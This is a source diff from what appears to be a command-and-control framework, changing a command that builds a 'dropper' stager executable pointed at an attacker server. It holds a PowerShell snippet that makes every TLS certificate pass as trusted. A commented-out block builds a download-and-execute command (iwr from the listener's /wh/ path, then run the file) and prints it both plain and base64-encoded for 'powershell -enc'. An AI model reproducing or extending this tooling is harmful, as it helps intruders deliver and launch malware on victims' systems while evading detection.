@@ -12,7 +12,7 @@ using System.Text.RegularExpressions;
 
 namespace Commander.Commands.Laucher
 {
-    public class BuildStagerCommandOptions
+    public class BuildStagerFromAgentCommandOptions
     {
 
         public string endpoint { get; set; }
@@ -29,15 +29,15 @@ namespace Commander.Commands.Laucher
 
         public bool verbose { get; set; }
     }
-    public class BuildStagerCommand : EnhancedCommand<BuildStagerCommandOptions>
+    public class BuildStagerFromAgentCommand : EnhancedCommand<BuildStagerFromAgentCommandOptions>
     {
-        public static string PowershellSSlScript = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";
+        public static string PowershellSSlScript  = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";
 
-        public override string Category => CommandCategory.Launcher;
+        public override string Category => CommandCategory.Core;
         public override string Description => "Create a stager file";
         public override string Name => "stager";
 
-        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;
+        public override ExecutorMode AvaliableIn => ExecutorMode.Agent;
 
         public override RootCommand Command => new RootCommand(this.Description)
         {
@@ -51,15 +51,12 @@ namespace Commander.Commands.Laucher
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
         };
 
-        protected override async Task<bool> HandleCommand(CommandContext<BuildStagerCommandOptions> context)
+        protected override async Task<bool> HandleCommand(CommandContext<BuildStagerFromAgentCommandOptions> context)
         {
 
-
             var agent = context.Executor.CurrentAgent;
-
-
             var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
-            if (!endpoint.IsValid)
+            if(!endpoint.IsValid)
             {
                 context.Terminal.WriteError($"[X] EndPoint is not valid !");
                 return false;
@@ -67,7 +64,6 @@ namespace Commander.Commands.Laucher
 
             var url = context.Options.url;
             int urlPort = 80;
-            string urlProtocol = "http";
             if (string.IsNullOrEmpty(url))
             {
                 if (endpoint.Protocol == ConnexionType.Http)
@@ -79,26 +75,23 @@ namespace Commander.Commands.Laucher
                     url = "http://" + endpoint.Address + $":{urlPort}/wh/";
                 }
 
-                context.Terminal.WriteLine($"Url was not specified, using {url} !");
+                context.Terminal.WriteLine($"[X] Url was not specified, using {url} !");
             }
 
             try
             {
                 Uri uri = new Uri(url);
                 urlPort = uri.Port;
-                urlProtocol = uri.Scheme.ToLower();
             }
             catch (Exception ex)
             {
                 //context.Terminal.WriteLine(ex.ToString());
             }
 
-            //context.Terminal.WriteLine($"Url Port = {urlPort}");
-
             var outFile = context.Options.fileName;
-            if (string.IsNullOrEmpty(outFile))
+            if(string.IsNullOrEmpty(outFile))
             {
-                outFile = "stager_" + endpoint.ProtocolString + "_" + Regex.Replace(endpoint.Address, @"[^\w\s]", "_") + "_" + endpoint.Port;
+                outFile = "stager_" + endpoint.ProtocolString + "_" + Regex.Replace(endpoint.Address, @"[^\w\s]", "_");
             }
 
             if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
@@ -110,7 +103,7 @@ namespace Commander.Commands.Laucher
                 outPath = Path.Combine(context.Options.save, outFile);
             }
 
-
+            
             var parms = BuildHelper.ComputeNimBuildParameters("dropper", outPath, context.Options.debug, false);
 
             if (context.Options.x86)
@@ -128,10 +121,10 @@ namespace Commander.Commands.Laucher
                 fileName += "-x86";
             fileName += ".b64";
 
-            parms.Insert(4, $"-d:ServerUrl={url}/wh/");
+            parms.Insert(4, $"-d:ServerUrl={url}");
             parms.Insert(5, $"-d:DotNetParams={endpoint}");
             parms.Insert(6, $"-d:FileName={fileName}");
-
+            
             context.Terminal.WriteLine($"[>] Generating dropper...");
 
             if (context.Options.verbose)
@@ -149,25 +142,29 @@ namespace Commander.Commands.Laucher
             context.Terminal.WriteSuccess($"[*] Build succeed.");
             context.Terminal.WriteInfo($"Dropper can be found at {outPath}");
 
-            if (context.Options.webhost)
+            //TODO should send to be hosted in the agent web server
+            /*if (context.Options.webhost)
             {
                 byte[] fileContent = File.ReadAllBytes(outPath);
                 context.CommModule.WebHost(outFile, fileContent);
 
-                string whurl = $"{url}/wh/{outFile}";
-                context.Terminal.WriteLine($"[*] dropper hosted on : {whurl}");
+                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/wh/{outFile}";
+                context.Terminal.WriteLine($"[*] dropper hosted on : {url}");
 
-                string script = $"iwr -Uri '{whurl}' -OutFile '{outFile}'; .\\{outFile}";
+                string script = $"iwr -Uri '{url}' -OutFile '{outFile}'; .\\{outFile}";
 
-                if (urlProtocol == "https")
+                if (listener.Secured)
+                {
+
                     script = PowershellSSlScript + script;
+                }
 
                 string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
 
                 //string encoded = Encoding.UTF8.GetString(utf8String)
                 context.Terminal.WriteLine($"[>] Command : powershell -c \"{script}\"");
                 context.Terminal.WriteLine($"[>] Command : powershell -enc {enc64}");
-            }
+            }*/
 
             return true;
         }
